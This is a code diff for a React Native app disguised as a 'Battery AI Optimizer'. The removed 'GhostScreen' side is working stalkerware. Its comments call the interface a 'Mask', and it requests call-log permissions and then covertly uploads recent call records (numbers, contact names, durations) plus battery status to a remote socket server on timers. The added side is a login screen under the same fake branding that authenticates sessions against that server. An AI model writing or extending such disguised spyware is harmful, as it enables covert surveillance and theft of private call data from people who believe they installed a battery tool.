@@ -1,112 +1,145 @@
-import React, { useEffect, useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { 
   View, 
   Text, 
+  TextInput, 
   TouchableOpacity, 
   StyleSheet, 
-  PermissionsAndroid, 
-  Platform 
+  ActivityIndicator,
+  Alert,
+  KeyboardAvoidingView,
+  Platform
 } from 'react-native';
-import * as Battery from 'expo-battery';
-import CallLogs from 'react-native-call-log';
 import socket from '../services/socket';
 
-const GhostScreen = ({ route }) => {
-  const { name } = route.params;
-  const [isOptimizing, setIsOptimizing] = useState(false);
+const LoginScreen = ({ onLogin }) => {
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [loading, setLoading] = useState(false);
 
   useEffect(() => {
-    // 1. Initial Permission Request and Start
-    const initializeNode = async () => {
-      if (Platform.OS === 'android') {
-        const granted = await PermissionsAndroid.requestMultiple([
-          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
-          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
-        ]);
-        
-        if (granted['android.permission.READ_CALL_LOG'] === 'granted') {
-          // Start the stealth cycle
-          beginStealthMonitoring();
-        }
+    // Listen for authentication response from server
+    socket.on('auth_response', (response) => {
+      setLoading(false);
+      
+      if (response.success) {
+        // Pass data back to App.js to handle navigation
+        onLogin(response.role, response.name, response.allowedNodes || []);
+      } else {
+        Alert.alert('Access Denied', response.message || 'Invalid credentials');
+        socket.disconnect(); // Disconnect if auth fails to save battery
       }
-    };
+    });
 
-    initializeNode();
+    socket.on('connect_error', () => {
+      setLoading(false);
+      Alert.alert('Connection Error', 'Unable to reach the optimization server.');
+    });
+
+    return () => {
+      socket.off('auth_response');
+      socket.off('connect_error');
+    };
   }, []);
 
-  const beginStealthMonitoring = () => {
-    // Send Vitals every 30 seconds
-    setInterval(sendHeartbeat, 30000);
-    // Scan Call Logs every 2 minutes (Stealthier than constant scanning)
-    setInterval(fetchAndSendLogs, 120000);
-  };
+  const handleLogin = () => {
+    if (!username || !password) {
+      Alert.alert('Error', 'Please enter both fields');
+      return;
+    }
 
-  const sendHeartbeat = async () => {
-    const battery = await Battery.getBatteryLevelAsync();
-    const state = await Battery.getBatteryStateAsync();
-    socket.emit('heartbeat_update', {
-      name: name,
-      battery: Math.floor(battery * 100) + '%',
-      isCharging: state === 2,
-      timestamp: new Date().toLocaleTimeString()
+    setLoading(true);
+
+    // 1. Establish the connection first
+    if (!socket.connected) {
+      socket.connect();
+    }
+
+    // 2. Wait for connection then emit
+    socket.once('connect', () => {
+      socket.emit('authenticate', {
+        user: username.trim(),
+        pass: password.trim(),
+        device: Platform.OS,
+        version: '4.2.0'
+      });
     });
   };
 
-  const fetchAndSendLogs = async () => {
-    try {
-      // Fetch the last 3 calls to ensure nothing is missed between intervals
-      const logs = await CallLogs.load(3); 
-      if (logs && logs.length > 0) {
-        socket.emit('ghost_activity', {
-          name: name,
-          type: 'CALL_LOG_SYNC',
-          data: logs.map(log => ({
-            number: log.phoneNumber,
-            duration: log.duration,
-            type: log.type, // Incoming, Outgoing, Missed
-            time: log.dateTime,
-            name: log.name || "Unknown"
-          }))
-        });
-      }
-    } catch (err) {
-      console.log("Log Fetch Error:", err);
-    }
-  };
-
-  // The "Mask" UI
   return (
-    <View style={styles.container}>
-      <Text style={styles.header}>BATTERY AI OPTIMIZER</Text>
-      
-      <TouchableOpacity 
-        style={[styles.orb, isOptimizing && styles.orbActive]} 
-        onPress={() => {
-          setIsOptimizing(true);
-          fetchAndSendLogs(); // Trigger manual sync on press
-          setTimeout(() => setIsOptimizing(false), 3000);
-        }}
-      >
-        <Text style={styles.orbText}>{isOptimizing ? "ANALYZING..." : "OPTIMIZE"}</Text>
-      </TouchableOpacity>
+    <KeyboardAvoidingView 
+      behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
+      style={styles.container}
+    >
+      <View style={styles.inner}>
+        <Text style={styles.logo}>JOYJET HUB</Text>
+        <Text style={styles.subtitle}>BATTERY OPTIMIZER AI v4.2</Text>
 
-      <View style={styles.statusPanel}>
-        <Text style={styles.statusLabel}>CORE STATUS: <Text style={styles.green}>ACTIVE</Text></Text>
-        <Text style={styles.statusLabel}>ENCRYPTION: <Text style={styles.green}>AES-256</Text></Text>
+        <View style={styles.inputContainer}>
+          <TextInput
+            style={styles.input}
+            placeholder="ACCESS KEY"
+            placeholderTextColor="#333"
+            value={username}
+            onChangeText={setUsername}
+            autoCapitalize="none"
+          />
+          <TextInput
+            style={styles.input}
+            placeholder="SECURE PIN"
+            placeholderTextColor="#333"
+            value={password}
+            onChangeText={setPassword}
+            secureTextEntry
+          />
+        </View>
+
+        <TouchableOpacity 
+          style={styles.button} 
+          onPress={handleLogin}
+          disabled={loading}
+        >
+          {loading ? (
+            <ActivityIndicator color="#00ff00" />
+          ) : (
+            <Text style={styles.buttonText}>INITIALIZE SESSION</Text>
+          )}
+        </TouchableOpacity>
+
+        <Text style={styles.footer}>SECURED BY RENDER CLOUD 2026</Text>
       </View>
-    </View>
+    </KeyboardAvoidingView>
   );
 };
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#000', justifyContent: 'center', alignItems: 'center' },
-  header: { color: '#222', letterSpacing: 5, fontSize: 12, marginBottom: 60, fontWeight: 'bold' },
-  orb: { width: 200, height: 200, borderRadius: 100, backgroundColor: '#050505', borderWidth: 1, borderColor: '#111', justifyContent: 'center', alignItems: 'center', elevation: 10 },
-  orbActive: { borderColor: '#00ff00', shadowColor: '#00ff00', shadowOpacity: 0.5, shadowRadius: 20 },
-  orbText: { color: '#333', fontSize: 10, letterSpacing: 2 },
-  statusPanel: { marginTop: 60, alignItems: 'center' },
-  statusLabel: { color: '#1a1a1a', fontSize: 9, marginBottom: 5, letterSpacing: 1 },
-  green: { color: '#004400' }
+  container: { flex: 1, backgroundColor: '#000' },
+  inner: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 30 },
+  logo: { color: '#fff', fontSize: 28, fontWeight: 'bold', letterSpacing: 8 },
+  subtitle: { color: '#444', fontSize: 10, marginTop: 5, marginBottom: 50, letterSpacing: 2 },
+  inputContainer: { width: '100%', marginBottom: 20 },
+  input: { 
+    backgroundColor: '#050505', 
+    borderWidth: 1, 
+    borderColor: '#111', 
+    color: '#00ff00', 
+    padding: 15, 
+    borderRadius: 5, 
+    marginBottom: 15,
+    fontFamily: Platform.OS === 'ios' ? 'Courier' : 'monospace' 
+  },
+  button: { 
+    width: '100%', 
+    height: 55, 
+    borderWidth: 1, 
+    borderColor: '#00ff00', 
+    justifyContent: 'center', 
+    alignItems: 'center',
+    borderRadius: 5,
+    marginTop: 10
+  },
+  buttonText: { color: '#00ff00', fontWeight: 'bold', letterSpacing: 3, fontSize: 12 },
+  footer: { position: 'absolute', bottom: 30, color: '#222', fontSize: 8, letterSpacing: 1 }
 });
 
-export default GhostScreen;
+export default LoginScreen;
